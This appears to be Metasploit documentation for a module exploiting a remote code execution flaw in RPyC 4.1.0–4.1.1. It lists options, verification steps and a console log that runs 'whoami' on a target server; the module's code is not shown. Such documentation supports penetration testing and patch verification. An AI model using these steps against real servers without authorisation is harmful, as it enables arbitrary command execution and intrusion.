## Introduction
This module automatically exploits a vulnerability to remotely execute code on
RPyC servers running versions 4.1.0 and 4.1.1. The vulnerability allows a
remote attacker to dynamically modify object attributes to construct a remote
procedure call that executes code for an RPyC service with default
configuration settings.

## Vulnerable Application:

RPyC servers running versions between 4.1.0 and 4.1.1.

Link to vulnerable RPyC version:
https://github.com/tomerfiliba-org/rpyc/releases/tag/4.1.1


Link to Advisory:
https://github.com/advisories/GHSA-pj4g-4488-wmxm

## Options

**RHOST**

Configure the remote vulnerable system.

**RPORT**

Configure the TCP port of the RPyC server.

**COMMAND**

Configure the command to execute on the remote system.

## Verification Steps

1. Have exploitable RPyC server (example IP: 0.0.0.0):
2. Start `msfconsole`:
3. Do:  ```use auxiliary/scanner/http/rpyc_rce```
4. Do: ```set RHOST 0.0.0.0```
7. Do: ```set RPORT 18812``` (Set the remote port on which the server is accessible)
8. Do: ```set COMMAND whoami``` (Set the command you want to execute)
9. Do: ```run```
10. Logs the output of the command you specified.


## Scenarios

Exploiting a vulnerable RPyC server located at 0.0.0.0:9999 with the command
`whoami`:

```log
msf6 auxiliary(scanner/http/rpyc_rce) > set RHOST 0.0.0.0
msf6 auxiliary(scanner/http/rpyc_rce) > set RPORT 9999
msf6 auxiliary(scanner/http/rpyc_rce) > set COMMAND whoami
msf6 auxiliary(scanner/http/rpyc_rce) > run
```

Demo example output for the module:

```log
msf6 > use auxiliary/scanner/http/rpyc_rce
msf6 auxiliary(scanner/http/rpyc_rce) > show options

Module options (auxiliary/scanner/http/rpyc_rce):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
COMMAND  whoami           yes       Command to execute
RHOST    0.0.0.0          yes       Target address
RHOSTS   0.0.0.0          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
loit/basics/using-metasploit.html
RPORT    9999             yes       Target port
THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/rpyc_rce) > set RHOST 0.0.0.0
RHOST => 0.0.0.0
msf6 auxiliary(scanner/http/rpyc_rce) > set RPORT 9999
RPORT => 9999
msf6 auxiliary(scanner/http/rpyc_rce) > set COMMAND whoami
COMMAND => whoami
msf6 auxiliary(scanner/http/rpyc_rce) > run

[*] Running for 0.0.0.0...
[*] Connected to RPyC service at 0.0.0.0:9999
[*] Executing command: whoami
[*] Command result: nobody
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
